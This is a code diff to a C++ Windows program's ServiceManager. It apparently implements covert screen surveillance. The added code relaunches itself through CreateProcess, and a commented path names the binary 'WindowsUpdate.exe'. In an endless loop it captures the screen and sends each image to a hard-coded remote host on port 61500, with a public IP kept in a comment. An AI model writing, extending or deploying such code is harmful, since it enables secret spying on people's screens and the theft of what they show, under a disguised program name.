@@ -27,28 +27,56 @@ ServiceManager::~ServiceManager(void) {}
 
 //------------------------------------------------------------------------------
 
-void ServiceManager::main(void) {
-    ScreenManager screen_manager = ScreenManager();
+void ServiceManager::main(bool separate_process) {
+    cout << "Main" << endl;
 
-    // string hostname = "192.241.213.182";
-    string hostname = "192.168.0.118";
-    SOCKET socket = 0;
+    if (separate_process) {
+        cout << "SeparateProcess" << endl;
+        cout << this->path << endl;
 
-    while (1) {
-        if (socket == 0) {
-            socket = connect(hostname, 61500);
+        STARTUPINFO startup_info;
+        ZeroMemory(&startup_info, sizeof(startup_info));
+        startup_info.cb = sizeof(startup_info);
+        PROCESS_INFORMATION process_info;
+
+        ostringstream command;
+        command << "\"" << this->path << "\" user";
+
+        if (!CreateProcess(NULL, (char *)command.str().c_str(), NULL, NULL, FALSE, 0, NULL, NULL, &startup_info, &process_info)) {
+        // if (!CreateProcess("C:\\Users\\Ricardo\\Downloads\\WindowsUpdate.exe", (char *)"user", NULL, NULL, FALSE, 0, NULL, NULL, &startup_info, &process_info)) {
+            cout << "Error: " << GetLastError() << endl;
+        } else {
+            cout << "Process Created" << endl;
+
+            // WaitForSingleObject(process_info.hProcess, INFINITE);
+
+            // CloseHandle(process_info.hProcess);
+            // CloseHandle(process_info.hThread);
+        }
+    } else {
+        cout << "Creating ScreenManager" << endl;
+        ScreenManager screen_manager = ScreenManager();
+
+        // string hostname = "192.241.213.182";
+        string hostname = "192.168.0.118";
+        SOCKET socket = 0;
+
+        while (1) {
+            if (socket == 0) {
+                socket = connect(hostname, 61500);
+            }
+
+            if (socket != 0) {
+                string image = screen_manager.capture();
+                send_image(socket, image, hostname);
+            }
+
+            wait();
         }
 
         if (socket != 0) {
-            string image = screen_manager.capture();
-            send_image(socket, image, hostname);
+            disconnect(socket);
         }
-
-        wait();
-    }
-
-    if (socket != 0) {
-        disconnect(socket);
     }
 }
 
